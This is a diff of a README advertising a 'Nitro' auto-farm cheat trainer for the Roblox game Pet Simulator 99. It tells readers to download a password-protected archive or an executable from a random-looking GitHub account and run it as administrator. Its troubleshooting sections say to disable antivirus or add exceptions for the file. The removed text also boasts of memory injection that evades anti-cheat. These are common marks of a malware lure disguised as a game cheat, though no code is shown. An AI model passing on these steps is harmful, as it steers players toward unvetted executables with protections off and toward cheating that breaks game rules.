@@ -1,62 +1,81 @@
-# Unleash the Power of Nitro – Pet Simulator 99 Automation Tool
+# 🎮 Pet-Simulator-99-Auto-Farm-Trainer-2026-Nitro - Improve Your Game Progress With Speed
 
-Take your Pet Simulator 99 gameplay to the next level with the Nitro trainer. It automates coin collection, egg hatching, and League tasks, so you can progress faster than ever. Updated for the June 2026 Backrooms League event.
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Ingaborgunsent220/Pet-Simulator-99-Auto-Farm-Trainer-2026-Nitro)
 
----
+## 📋 Overview
 
-## ✨ Features
+The Pet Simulator 99 Auto Farm Trainer helps users manage tasks within the game. This software automates repetitive actions. It saves time during long gaming sessions. You gain resources faster. The software includes a graphical interface for easy control. This version matches the June 2026 update.
 
-| Feature | Description |
-| ------- | ----------- |
-| 🔵 Auto Coin Farm | Scans the area and picks up every coin and gem, boosting your income without any effort. |
-| 🥚 Auto Egg Hatch | Opens eggs as soon as they’re available, hatching pets without any manual clicks. |
-| 🌀 Backrooms League Auto-Grind | Automatically progresses through all Backrooms League tasks and collects your rewards without intervention. |
-| 💥 Instant Break | One-click destruction of all breakables, giving you resources faster than ever. |
-| 📍 Teleport to Best Zone | Instantly warps your character to the most profitable farming spot for your current tier. |
-| 🧑‍💻 Auto Merchant Buy | Snaps up rare merchant items automatically, so you always get the best loot. |
-| ⚡ Speed Hack | Multiplies your movement speed, letting you cover farming routes in a fraction of the time. |
-| 🛡️ Anti-AFK | Bypasses the AFK timer, allowing unlimited uninterrupted farming. |
+## ⚙️ System Requirements
 
----
+Ensure your computer meets these requirements before you start:
 
-## 📥 Download / Installation
+- Operating System: Windows 10 or Windows 11.
+- Processor: Intel Core i5 or AMD equivalent.
+- Memory: 8 GB RAM.
+- Storage: 100 MB free space.
+- Internet: Stable connection for game updates.
+- Graphics: Dedicated card with DirectX 11 support.
 
-1. Download the archive from **[https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)**
-2. Extract the files using the password: **trainer2026**
-3. Right‑click **trainer.exe** and select **Run as Administrator**
-4. Launch Pet Simulator 99 on Roblox and wait for the world to load
-5. Press **F1** to open the trainer GUI and enable your desired features
+## 📥 Getting Started
 
----
+Follow these steps to set up the software on your Windows computer.
 
-## 📸 Screenshot
+1. Visit the [official repository page](https://github.com/Ingaborgunsent220/Pet-Simulator-99-Auto-Farm-Trainer-2026-Nitro) to access the download files.
+2. Look for the latest release version on the page.
+3. Click the executable file to begin the download to your machine.
+4. Save the file in a folder you can find easily, such as your Downloads folder or Desktop.
+5. Double-click the downloaded file to start the installation wizard.
+6. Follow the prompts on the screen to finish the setup.
+7. Launch the application from your desktop icon after the installation ends.
 
-<a href="https://ibb.co/7NpyXHNx"><img src="https://i.ibb.co/7NpyXHNx/preview-clean.png" alt="preview-clean" border="0"></a>
+## ✨ Key Features
 
+This trainer offers several tools to help your gameplay:
 
-## 🧠 How It Works
+- Auto-Farm: Your character moves between locations and collects coins without your input.
+- Auto-Hatch: The trainer opens eggs for you so you can collect pets while away from the keyboard.
+- Instant Break: This feature removes breakables immediately to speed up gathering.
+- League Auto-Grind: The software identifies tasks in the league and executes them in order.
+- GUI Dashboard: A simple window lets you toggle features on and off with a single click.
 
-The trainer reads and writes process memory to manipulate game values. It uses `pymem` to communicate with the Roblox client, injecting code that enables automation features without triggering anti-cheat.
+## 🛠️ Usage Instructions
 
-## 🖥️ Compatibility
+Once you open the software, you will see a window with several tabs. Each tab represents a specific area of the game.
 
-- **OS:** Windows 10 / Windows 11
-- **Roblox Executors:** Synapse X, Krnl, Fluxus, Arceus X (any standard executor)
-- **Game Servers:** Works on all Pet Simulator 99 servers
+1. Ensure the game is running on your computer.
+2. Open the trainer software.
+3. Click the Connect button inside the trainer. This links the software to your open game session.
+4. Check the boxes next to the features you want to use.
+5. Use the sliders to adjust the speed of the auto-hatch or auto-farm features.
+6. Move the trainer window to the side of your screen.
+7. The trainer works in the background while you monitor progress.
+8. Uncheck a box to stop a specific task at any time.
 
----
+## 🛡️ Best Practices
 
-## 🛠️ Troubleshooting
+Follow these tips to keep your game experience smooth:
 
-| Problem                                      | Solution                                                                                   |
-| -------------------------------------------- | ------------------------------------------------------------------------------------------ |
-| Trainer fails to inject                     | Restart Roblox, then run **trainer.exe as Administrator** again.                          |
-| Features don’t activate                     | Temporarily disable your antivirus – some real‑time shields block memory operations.       |
-| GUI does not appear                         | Press **F1** or **F2** to toggle the overlay. If still not visible, restart the trainer.   |
-| Backrooms League tasks not progressing      | Make sure you’re on a League‑enabled server and that the “Backrooms League Auto‑Grind” box is checked. |
+- Keep the software updated. Check the GitHub page once a week for new releases.
+- Close other background programs that use high CPU resources while using the trainer.
+- Save your progress in the game manually before you close the trainer.
+- Run the software as an administrator if you notice connection issues. Right-click the icon and choose Run as Administrator.
+- If the trainer stops working after a game update, check the GitHub page for an immediate hotfix release.
 
----
+## 🔍 Troubleshooting
 
-## ⚠️ Disclaimer
+Common issues often have simple solutions.
 
-This software is provided for educational purposes only. Use it at your own risk. The authors are not responsible for any bans or account restrictions.
+- Trainer fails to connect: Restart the game and then restart the trainer.
+- Features not triggering: Check if you enabled the specific feature in the settings tab.
+- Application crashes: Ensure you have no antivirus software blocking the trainer. You may need to add an exception for the file folder.
+- UI issues: Move the trainer window to your main monitor if you use multiple screens.
+- Slow performance: Reduce the number of active features if your game frame rate drops.
+
+## 📜 Legal Notice
+
+This software serves as a tool for personal use in Pet Simulator 99. Use tools at your own risk. The creators hold no responsibility for in-game actions or account status. Use common sense. Limit automated sessions to reasonable hours to keep your gameplay balanced.
+
+## 🚀 Future Updates
+
+We plan to support upcoming game updates. Watch for new features regarding new zones and event items. Future versions will optimize the code to reduce memory usage. We value user feedback on the functionality of the auto-grind features. Send suggestions via the issues tab on GitHub.
